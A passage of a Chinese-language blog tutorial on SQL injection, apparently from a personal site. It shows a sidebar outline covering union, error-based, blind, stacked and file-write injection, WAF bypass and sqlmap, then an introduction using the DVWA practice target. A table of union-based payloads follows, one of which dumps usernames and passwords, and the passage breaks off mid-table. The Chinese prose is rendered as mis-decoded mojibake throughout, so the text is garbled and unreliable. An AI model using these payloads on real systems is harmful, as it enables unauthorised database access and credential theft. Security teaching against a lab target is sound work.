  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹é“¾</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>
    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#æ‰‹å·¥æ³¨å…¥">æ‰‹å·¥æ³¨å…¥</a>
      <ol>
        <li><a href="#0-ç¯å¢ƒé…ç½®">#0 ç¯å¢ƒé…ç½®</a></li>
        <li><a href="#1-unionè”åˆæŸ¥è¯¢æ³¨å…¥">#1 unionè”åˆæŸ¥è¯¢æ³¨å…¥</a>
          <ol>
            <li><a href="#å¸¸ç”¨å‡½æ•°">å¸¸ç”¨å‡½æ•°</a></li>
            <li><a href="#1åˆ¤æ–­æ³¨å…¥æ˜¯å­—ç¬¦ç±»å‹oræ•°å­—å‹">1.åˆ¤æ–­æ³¨å…¥æ˜¯å­—ç¬¦ç±»å‹oræ•°å­—å‹</a></li>
            <li><a href="#2çŒœæµ‹sqlæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°åˆ—æ•°">2.çŒœæµ‹SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°ï¼ˆåˆ—æ•°ï¼‰</a></li>
            <li><a href="#3ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº">3.ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº</a></li>
            <li><a href="#4è·å–å½“å‰æ•°æ®åº“">4.è·å–å½“å‰æ•°æ®åº“</a></li>
            <li><a href="#5è·å–æ•°æ®åº“ä¸­çš„è¡¨">5.è·å–æ•°æ®åº“ä¸­çš„è¡¨</a></li>
            <li><a href="#6è·å–è¡¨ä¸­çš„å­—æ®µå">6.è·å–è¡¨ä¸­çš„å­—æ®µå</a></li>
            <li><a href="#7è·å–å­—æ®µä¿¡æ¯">7.è·å–å­—æ®µä¿¡æ¯</a></li>
            <li><a href="#8é€è¡Œè·å–ä¿¡æ¯">8.é€è¡Œè·å–ä¿¡æ¯</a></li>
          </ol>
        </li>
        <li><a href="#2-æŠ¥é”™æ³¨å…¥">#2 æŠ¥é”™æ³¨å…¥</a>
          <ol>
            <li><a href="#å¸¸ç”¨å‡½æ•°-1">å¸¸ç”¨å‡½æ•°</a>
              <ol>
                <li><a href="#extractvalue-xml_document-xpath_string">extractvalue (XML_document, XPath_string)</a></li>
                <li><a href="#updatexml-xml_document-xpath_string-new_value">updatexml (XML_document, XPath_string, new_value)</a></li>
              </ol>
            </li>
            <li><a href="#ä¸é‚£ä¹ˆå¸¸ç”¨çš„å‡½æ•°">ä¸é‚£ä¹ˆå¸¸ç”¨çš„å‡½æ•°</a>
              <ol>
                <li><a href="#floorå‡½æ•°8xmysql50">floorå‡½æ•°(8.x&gt;mysql&gt;5.0ï¼‰</a></li>
                <li><a href="#st_latfromgeohashgeohash_string">ST_LatFromGeoHash(geohash_string)</a></li>
                <li><a href="#st_longfromgeohashgeohash_string">ST_LongFromGeoHash(geohash_string)</a></li>
                <li><a href="#st_pointfromgeohashgeohash_string-srid">ST_PointFromGeoHash(geohash_string, srid)</a></li>
                <li><a href="#gtid_subsetsubset-set">GTID_SUBSET(subset, set)</a></li>
              </ol>
            </li>
            <li><a href="#çˆ†ç ´æ•°æ®åº“åç§°">çˆ†ç ´æ•°æ®åº“åç§°</a></li>
            <li><a href="#çˆ†ç ´è¡¨å">çˆ†ç ´è¡¨å</a></li>
            <li><a href="#çˆ†ç ´åˆ—å">çˆ†ç ´åˆ—å</a></li>
            <li><a href="#çˆ†ç ´å­—æ®µå†…å®¹">çˆ†ç ´å­—æ®µå†…å®¹</a></li>
          </ol>
        </li>
        <li><a href="#3-ç›²æ³¨">#3 ç›²æ³¨</a>
          <ol>
            <li><a href="#å¸¸ç”¨å‡½æ•°-2">å¸¸ç”¨å‡½æ•°</a></li>
            <li><a href="#å¸ƒå°”ç›²æ³¨">å¸ƒå°”ç›²æ³¨</a>
              <ol>
                <li><a href="#çŒœæµ‹é•¿åº¦">çŒœæµ‹é•¿åº¦</a></li>
                <li><a href="#çŒœæµ‹åº“å">çŒœæµ‹åº“å</a></li>
                <li><a href="#çŒœæµ‹è¡¨çš„æ•°é‡">çŒœæµ‹è¡¨çš„æ•°é‡</a></li>
                <li><a href="#çŒœæµ‹è¡¨2çš„é•¿åº¦">çŒœæµ‹è¡¨2çš„é•¿åº¦</a></li>
              </ol>
            </li>
            <li><a href="#æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨</a>
              <ol>
                <li><a href="#sleepå»¶æ—¶">sleepå»¶æ—¶</a></li>
                <li><a href="#benchmarkå»¶æ—¶">benchmarkå»¶æ—¶</a></li>
                <li><a href="#ç¬›å¡å°”ç§¯å»¶æ—¶">ç¬›å¡å°”ç§¯å»¶æ—¶</a></li>
                <li><a href="#æ­£åˆ™åŒ¹é…å»¶æ—¶">æ­£åˆ™åŒ¹é…å»¶æ—¶</a></li>
              </ol>
            </li>
            <li><a href="#æŠ¥é”™ç›²æ³¨">æŠ¥é”™ç›²æ³¨</a>
              <ol>
                <li><a href="#exp">exp()</a></li>
                <li><a href="#cot">cot()</a></li>
                <li><a href="#pow">pow()</a></li>
              </ol>
            </li>
          </ol>
        </li>
        <li><a href="#4-å †å æ³¨å…¥">#4 å †å æ³¨å…¥</a>
          <ol>
            <li><a href="#æ™®é€šå¤šè¯­å¥æ³¨å…¥">æ™®é€šå¤šè¯­å¥æ³¨å…¥</a></li>
            <li><a href="#showæŸ¥è¯¢">showæŸ¥è¯¢</a>
              <ol>
                <li><a href="#æŸ¥è¯¢æ•°æ®åº“åç§°">æŸ¥è¯¢æ•°æ®åº“åç§°</a></li>
                <li><a href="#æŸ¥è¯¢æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨">æŸ¥è¯¢æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨</a></li>
                <li><a href="#æŸ¥çœ‹è¡¨çš„å­—æ®µ">æŸ¥çœ‹è¡¨çš„å­—æ®µ</a></li>
                <li><a href="#æŸ¥çœ‹åˆ›å»ºè¡¨çš„è¯­å¥">æŸ¥çœ‹åˆ›å»ºè¡¨çš„è¯­å¥</a></li>
              </ol>
            </li>
            <li><a href="#handleræŸ¥è¯¢">handleræŸ¥è¯¢</a>
              <ol>
                <li><a href="#æ‰“å¼€å¥æŸ„">æ‰“å¼€å¥æŸ„</a></li>
                <li><a href="#æŸ¥çœ‹ç¬¬ä¸€è¡Œæ•°æ®">æŸ¥çœ‹ç¬¬ä¸€è¡Œæ•°æ®</a></li>
                <li><a href="#æŸ¥çœ‹ä¸‹ä¸€è¡Œæ•°æ®">æŸ¥çœ‹ä¸‹ä¸€è¡Œæ•°æ®</a></li>
                <li><a href="#æŸ¥çœ‹æŸä¸€è¡Œæ•°æ®">æŸ¥çœ‹æŸä¸€è¡Œæ•°æ®</a></li>
                <li><a href="#å…³é—­å¥æŸ„">å…³é—­å¥æŸ„</a></li>
              </ol>
            </li>
          </ol>
        </li>
        <li><a href="#5-æ–‡ä»¶è¯»å†™æ³¨å…¥">#5 æ–‡ä»¶è¯»å†™æ³¨å…¥</a>
          <ol>
            <li><a href="#å‰æ">å‰æ</a></li>
            <li><a href="#æ–‡ä»¶è¯»å–">æ–‡ä»¶è¯»å–</a></li>
            <li><a href="#æ™®é€šæ–‡ä»¶å†™å…¥">æ™®é€šæ–‡ä»¶å†™å…¥</a>
              <ol>
                <li><a href="#union-select">union select</a></li>
                <li><a href="#lines-terminated-by">lines terminated by</a></li>
                <li><a href="#lins-starting-by">lins starting by</a></li>
                <li><a href="#fields-terminated-by">fields terminated by</a></li>
                <li><a href="#columns-terminated-by">columns terminated by</a></li>
              </ol>
            </li>
            <li><a href="#æ—¥å¿—æ–‡ä»¶å†™å…¥">æ—¥å¿—æ–‡ä»¶å†™å…¥</a></li>
          </ol>
        </li>
        <li><a href="#6-dnslogæ³¨å…¥">#6 DNSlogæ³¨å…¥</a>
          <ol>
            <li><a href="#å‡†å¤‡dnslogå¹³å°">å‡†å¤‡DNSlogå¹³å°</a></li>
            <li><a href="#æ„é€ æ³¨å…¥payload">æ„é€ æ³¨å…¥Payload</a></li>
          </ol>
        </li>
        <li><a href="#7-httpè¯·æ±‚æ³¨å…¥">#7 httpè¯·æ±‚æ³¨å…¥</a>
          <ol>
            <li><a href="#getpostè¯·æ±‚æ³¨å…¥">GET/POSTè¯·æ±‚æ³¨å…¥</a></li>
            <li><a href="#httpå¤´éƒ¨å‚æ•°æ³¨å…¥">httpå¤´éƒ¨å‚æ•°æ³¨å…¥</a></li>
            <li><a href="#cookieæ³¨å…¥">cookieæ³¨å…¥</a></li>
          </ol>
        </li>
        <li><a href="#8-äºŒæ¬¡æ³¨å…¥">#8 äºŒæ¬¡æ³¨å…¥</a></li>
      </ol>
    </li>
    <li><a href="#ç»•è¿‡waf">ç»•è¿‡WAF</a>
      <ol>
        <li><a href="#1-ç©ºæ ¼è¿‡æ»¤ç»•è¿‡">#1 ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</a>
          <ol>
            <li><a href="#æ³¨é‡Šç»•è¿‡">æ³¨é‡Šç»•è¿‡</a></li>
            <li><a href="#urlç¼–ç ç»•è¿‡">urlç¼–ç ç»•è¿‡</a></li>
            <li><a href="#æ‹¬å·ç»•è¿‡">æ‹¬å·ç»•è¿‡</a>
              <ol>
                <li><a href="#æ•°å­—å‹">æ•°å­—å‹</a></li>
                <li><a href="#å­—ç¬¦å‹æ•°å­—å‹">å­—ç¬¦å‹&amp;æ•°å­—å‹</a></li>
              </ol>
            </li>
          </ol>
        </li>
        <li><a href="#2-å†…è”æ³¨é‡Šç»•è¿‡">#2 å†…è”æ³¨é‡Šç»•è¿‡</a>
          <ol>
            <li><a href="#ç»•è¿‡ç‰¹å®šå±è”½è¯">ç»•è¿‡ç‰¹å®šå±è”½è¯</a></li>
            <li><a href="#å¹²æ‰°wafè¿‡æ»¤">å¹²æ‰°WAFè¿‡æ»¤</a></li>
          </ol>
        </li>
        <li><a href="#3-å¤§å°å†™ç»•è¿‡">#3 å¤§å°å†™ç»•è¿‡</a></li>
        <li><a href="#4-åŒå†™ç»•è¿‡">#4 åŒå†™ç»•è¿‡</a></li>
        <li><a href="#5-ç¼–ç ç»•è¿‡">#5 ç¼–ç ç»•è¿‡</a>
          <ol>
            <li><a href="#åŒé‡urlç¼–ç ç»•è¿‡">åŒé‡URLç¼–ç ç»•è¿‡</a></li>
            <li><a href="#åå…­è¿›åˆ¶unicodeç¼–ç asciiç¼–ç ç»•è¿‡">åå…­è¿›åˆ¶ã€Unicodeç¼–ç ã€ASCIIç¼–ç ç»•è¿‡</a></li>
          </ol>
        </li>
        <li><a href="#6-ç­‰ä»·ä»£æ›¿ç»•è¿‡">#6 ç­‰ä»·ä»£æ›¿ç»•è¿‡</a>
          <ol>
            <li><a href="#é€»è¾‘ç¬¦å·è¿‡æ»¤">é€»è¾‘ç¬¦å·è¿‡æ»¤</a>
              <ol>
                <li><a href="#ç­‰å·è¿‡æ»¤ç»•è¿‡">ç­‰å·(=)è¿‡æ»¤ç»•è¿‡</a></li>
                <li><a href="#å¤§äºå·å’Œå°äºå·è¿‡æ»¤ç»•è¿‡">å¤§äºå·(&gt;)å’Œå°äºå·(&lt;)è¿‡æ»¤ç»•è¿‡</a></li>
                <li><a href="#andå’Œorè¿‡æ»¤ç»•è¿‡">andå’Œorè¿‡æ»¤ç»•è¿‡</a></li>
              </ol>
            </li>
            <li><a href="#æ³¨é‡Šç¬¦å·è¿‡æ»¤">æ³¨é‡Šç¬¦å·è¿‡æ»¤</a></li>
            <li><a href="#é€—å·è¿‡æ»¤">é€—å·è¿‡æ»¤</a>
              <ol>
                <li><a href="#ç»•è¿‡limitä¸­çš„é€—å·">ç»•è¿‡limitä¸­çš„é€—å·</a></li>
                <li><a href="#ç»•è¿‡å‡½æ•°å‚æ•°ä¸­çš„é€—å·">ç»•è¿‡å‡½æ•°å‚æ•°ä¸­çš„é€—å·</a></li>
                <li><a href="#ç»•è¿‡selectåˆ—è¡¨ä¸­çš„é€—å·">ç»•è¿‡selectåˆ—è¡¨ä¸­çš„é€—å·</a></li>
              </ol>
            </li>
            <li><a href="#å‡½æ•°è¿‡æ»¤">å‡½æ•°è¿‡æ»¤</a>
              <ol>
                <li><a href="#å¸¸è§å‡½æ•°è¿‡æ»¤">å¸¸è§å‡½æ•°è¿‡æ»¤</a></li>
                <li><a href="#case-whenè¯­å¥ä»£æ›¿if">case whenè¯­å¥ä»£æ›¿if</a></li>
                <li><a href="#reverseleftä»£æ›¿substring">reverse+leftä»£æ›¿substring</a></li>
                <li><a href="#trimä»£æ›¿substring">trimä»£æ›¿substring</a></li>
              </ol>
            </li>
          </ol>
        </li>
        <li><a href="#7-å®½å­—èŠ‚ç»•è¿‡">#7 å®½å­—èŠ‚ç»•è¿‡</a>
          <ol>
            <li><a href="#æ³¨å…¥åŸç†">æ³¨å…¥åŸç†</a></li>
            <li><a href="#æ³¨å…¥è¿‡ç¨‹">æ³¨å…¥è¿‡ç¨‹</a></li>
          </ol>
        </li>
        <li><a href="#8-æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡">#8 æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡</a></li>
        <li><a href="#9-å¤šå‚æ•°è¯·æ±‚ç»•è¿‡åŒè¾“å…¥è¡¨å•">#9 å¤šå‚æ•°è¯·æ±‚ç»•è¿‡ï¼ˆåŒè¾“å…¥è¡¨å•ï¼‰</a>
          <ol>
            <li><a href="#ç»•è¿‡é—´éš”ä»£ç ">ç»•è¿‡é—´éš”ä»£ç </a></li>
            <li><a href="#ä¸‡èƒ½å¯†ç ">ä¸‡èƒ½å¯†ç </a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#sqlmapä½¿ç”¨">SqlMapä½¿ç”¨</a>
      <ol>
        <li><a href="#åŸºæœ¬ä½¿ç”¨æ­¥éª¤">åŸºæœ¬ä½¿ç”¨æ­¥éª¤</a>
          <ol>
            <li><a href="#æ£€æŸ¥æ³¨å…¥ç‚¹">æ£€æŸ¥æ³¨å…¥ç‚¹</a></li>
            <li><a href="#çˆ†ç ´æ•°æ®åº“ä¿¡æ¯">çˆ†ç ´æ•°æ®åº“ä¿¡æ¯</a></li>
            <li><a href="#çˆ†ç ´æŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨å">çˆ†ç ´æŒ‡å®šæ•°æ®åº“çš„æ‰€æœ‰è¡¨å</a></li>
            <li><a href="#çˆ†ç ´æŒ‡å®šè¡¨çš„æ‰€æœ‰åˆ—å">çˆ†ç ´æŒ‡å®šè¡¨çš„æ‰€æœ‰åˆ—å</a>
              <ol>
                <li><a href="#updatexml-xml_document-xpath_string-new_value-1">updatexml (XML_document, XPath_string, new_value)</a></li>
              </ol>
            </li>
            <li><a href="#æ‰“å°æŒ‡å®šåˆ—åçš„å­—æ®µæ•°æ®">æ‰“å°æŒ‡å®šåˆ—åçš„å­—æ®µæ•°æ®</a></li>
            <li><a href="#æŸ¥çœ‹ç”¨æˆ·æƒé™">æŸ¥çœ‹ç”¨æˆ·æƒé™</a></li>
            <li><a href="#æŸ¥çœ‹æ•°æ®åº“å¯†ç ">æŸ¥çœ‹æ•°æ®åº“å¯†ç </a></li>
          </ol>
        </li>
        <li><a href="#ç»“åˆburpsuiteä½¿ç”¨">ç»“åˆburpsuiteä½¿ç”¨</a>
          <ol>
            <li><a href="#æ‹¦æˆªè¯·æ±‚">æ‹¦æˆªè¯·æ±‚</a></li>
            <li><a href="#è¿›è¡Œçˆ†ç ´">è¿›è¡Œçˆ†ç ´</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/">
                
                    <img src="http://picture.928330.xyz/typora/bbe3473c5e7044490ec526dc455a0a8c.jpeg" loading="lazy" alt="Featured image of post SQLæ³¨å…¥ï¼šä»å…¥é—¨åˆ°å…¥åœŸ" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/" >
                æŠ€æœ¯å­¦ä¹ 
            </a>
        
    </header>
    

    <div class="article-title-wrapper">


        <h2 class="article-title">
            <a href="/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/">SQLæ³¨å…¥ï¼šä»å…¥é—¨åˆ°å…¥åœŸ</a>
        </h2>
        
        <h3 class="article-subtitle">
            æ°¸æ— æ­¢å¢ƒ
        </h3>
        

    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">
                    å‘å¸ƒæ—¶é—´ï¼š2025-07-02</time>
            </div>
        

        

        <div class="article-lastmod">
               <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



               <time>
                   æ›´æ–°æ—¶é—´ï¼š2025-08-31
               </time>
           </div>
        <div>
            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
            <time class="article-time--published">
                æµè§ˆé‡ï¼š<span class="waline-pageview-count" data-waline-pageview-count="0">0</span>
            </time>
        </div>
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>SQLæ³¨å…¥æ˜¯æŒ‡webåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§æ²¡æœ‰åˆ¤æ–­æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨webåº”ç”¨ç¨‹åºä¸­äº‹å…ˆå®šä¹‰å¥½çš„æŸ¥è¯¢è¯­å¥çš„ç»“å°¾ä¸Šæ·»åŠ é¢å¤–çš„SQLè¯­å¥ï¼Œä»¥æ­¤æ¥å®ç°æ¬ºéª—æ•°æ®åº“æœåŠ¡å™¨æ‰§è¡Œéæˆæƒçš„ä»»æ„æŸ¥è¯¢ï¼Œä»è€Œå¾—åˆ°ç›¸åº”çš„æ•°æ®ä¿¡æ¯</p>
<p>æˆ‘ä»¬å¯ä»¥é€‰æ‹©<strong>æ‰‹å·¥æ³¨å…¥</strong>ï¼Œä¹Ÿèƒ½å¤Ÿé€‰æ‹©ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·<strong>sqlmap</strong>è¿›è¡Œæ³¨å…¥</p>
<h1 id="æ‰‹å·¥æ³¨å…¥">æ‰‹å·¥æ³¨å…¥
</h1><h2 id="0-ç¯å¢ƒé…ç½®">#0 ç¯å¢ƒé…ç½®
</h2><p><strong>ä½¿ç”¨é¶æœºï¼šDVWA mysql</strong></p>
<p>å°†DVWAçš„securityçº§åˆ«è®¾ç½®ä¸ºlowï¼Œå¯ä»¥çœ‹åˆ°phpæºç ä¸­æ˜¯ä¸€å¥ç®€å•çš„æŸ¥è¯¢è¯­å¥ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡è¿‡æ»¤</p>
<p><strong>å½“ç”¨æˆ·è¾“å…¥æŸ¥è¯¢å†…å®¹çš„æ—¶å€™ï¼Œ$idå°†ä¼šè¢«æ›¿æ¢æˆæ­¤å†…å®¹ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$query</span>  <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span style="color:#98c379">$id</span><span style="color:#98c379">&#39;;
</span></span></span></code></pre></div><p>æ¯”å¦‚ï¼Œæˆ‘ä»¬è¾“å…¥1ï¼Œé‚£ä¹ˆæ‰§è¡Œçš„è¯­å¥å°±æ˜¯</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#e06c75">first_name</span>, <span style="color:#e06c75">last_name</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">user_id</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;1&#39;</span>
</span></span></code></pre></div><p>é‚£å¦‚æœæˆ‘ä»¬è¾“å…¥1&rsquo; and 1=1#:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#e06c75">first_name</span>, <span style="color:#e06c75">last_name</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">user_id</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;1&#39;</span> <span style="color:#c678dd">and</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">#</span> <span style="color:#98c379">&#39;
</span></span></span></code></pre></div><p><strong>å¯ä»¥çœ‹åˆ°ï¼Œå‰é¢çš„&rsquo;&lsquo;é—­åˆäº†ï¼Œåé¢çš„&rsquo;è¢«æˆ‘ä»¬æ³¨é‡Šäº†ï¼Œä¸­é—´çš„and1=1ä¼šè¢«æ­£å¸¸æ‰§è¡Œ</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥åœ¨è¿™é‡Œé¢æ’å…¥è‡ªå·±æƒ³è¦æ‰§è¡Œçš„sqlè¯­å¥ï¼Œè¿™å°±æ˜¯SQLæ³¨å…¥ï¼</p>
<h2 id="1-unionè”åˆæŸ¥è¯¢æ³¨å…¥">#1 unionè”åˆæŸ¥è¯¢æ³¨å…¥
</h2><p>è™½ç„¶çŸ¥é“å¯ä»¥æ‰§è¡Œä»»æ„sqlä»£ç äº†ï¼Œä½†æ˜¯æˆ‘ä»¬åˆä¸çŸ¥é“æœ‰å“ªäº›è¡¨ï¼Œè¡¨é‡Œé¢æœ‰å“ªäº›å…ƒç´ ï¼Œæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p>
<p>æ‰€ä»¥ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€ç³»åˆ—çš„æ“ä½œï¼Œæ¥ç¡®å®šè¿™äº›ä¸œè¥¿ï¼š</p>
<p><strong>1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹</strong></p>
<p><strong>2.çŒœæµ‹SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°</strong></p>
<p><strong>3.ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº</strong></p>
<p><strong>4.è·å–å½“å‰æ•°æ®åº“</strong></p>
<p><strong>5.è·å–æ•°æ®åº“ä¸­çš„è¡¨</strong></p>
<p><strong>6.è·å–è¡¨ä¸­çš„å­—æ®µå</strong></p>
<p><strong>7.æ˜¾ç¤ºå­—æ®µä¿¡æ¯</strong></p>
<p>é‚£ä¹ˆï¼Œå¼€å§‹å§ï¼</p>
<h3 id="å¸¸ç”¨å‡½æ•°">å¸¸ç”¨å‡½æ•°
</h3><div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>åŠŸèƒ½ç±»åˆ«</th>
          <th>å‡½æ•°/è¯­å¥</th>
          <th>ä¸»è¦æ•°æ®åº“</th>
          <th>åŠŸèƒ½æè¿°</th>
          <th>æ³¨å…¥ç¤ºä¾‹</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>ç³»ç»Ÿä¿¡æ¯æŸ¥è¯¢</strong></td>
          <td><code>database()</code> æˆ– <code>schema()</code></td>
          <td>MySQL</td>
          <td>è·å–å½“å‰æ•°æ®åº“çš„åç§°</td>
          <td><code>' union select 1,database() #</code></td>
      </tr>
      <tr>
          <td></td>
          <td><code>version()</code> æˆ–<code>@@version</code></td>
          <td>é€šç”¨</td>
          <td>è·å–æ•°æ®åº“çš„è¯¦ç»†ç‰ˆæœ¬å·</td>
          <td><code>' union select 1,version() #</code></td>
      </tr>
      <tr>
          <td></td>
          <td><code>user()</code> æˆ– <code>current_user()</code></td>
          <td>é€šç”¨</td>
          <td>è·å–æ‰§è¡ŒæŸ¥è¯¢çš„æ•°æ®åº“ç”¨æˆ·å</td>
          <td><code>' union select 1,user() #</code></td>
      </tr>
      <tr>
          <td></td>
          <td><code>@@hostname</code></td>
          <td>MySQL, MSSQL</td>
          <td>è·å–æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºå</td>
          <td><code>' union select 1,@@hostname #</code></td>
      </tr>
      <tr>
          <td></td>
          <td><code>@@datadir</code></td>
          <td>MySQL</td>
          <td>è·å–æ•°æ®åº“æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„</td>
          <td><code>' union select 1,@@datadir #</code></td>
      </tr>
      <tr>
          <td><strong>æ•°æ®æŸ¥è¯¢ä¸æ‹¼æ¥</strong></td>
          <td><code>group_concat()</code></td>
          <td>MySQL, SQLite</td>
          <td><strong>çºµå‘å°†å¤šè¡Œç»“æœåˆå¹¶æˆä¸€ä¸ªå­—ç¬¦ä¸²ä¸€è¡Œæ˜¾ç¤º</strong>ï¼Œç”¨äºä¸€æ¬¡æ€§åˆ—å‡ºæ‰€æœ‰è¡¨å/åˆ—å</td>
          <td><code>' union select 1,group_concat(table_name) from information_schema.tables #</code></td>
      </tr>
      <tr>
          <td></td>
          <td><code>concat()</code> æˆ– <code>concat_ws()</code></td>
          <td>MySQL</td>
          <td>**æ¨ªå‘å°†å¤šä¸ªå­—ç¬¦ä¸²æˆ–åˆ—è¿æ¥æˆä¸€ä¸ªï¼Œä½†æ˜¯ä¸æ”¹å˜è¡Œæ•°ï¼Œ**ç”¨äºæ‹¼æ¥ç”¨æˆ·åå’Œå¯†ç ç­‰å­—æ®µ</td>
          <td><code>' union select 1,concat(username,':',password) from users #</code></td>
      </tr>
      <tr>
          <td></td>
          <td><code>count()</code></td>
          <td>é€šç”¨</td>
          <td>ç»Ÿè®¡è¡Œæ•°</td>
          <td><code>' union select 1,count(*) from users #</code></td>
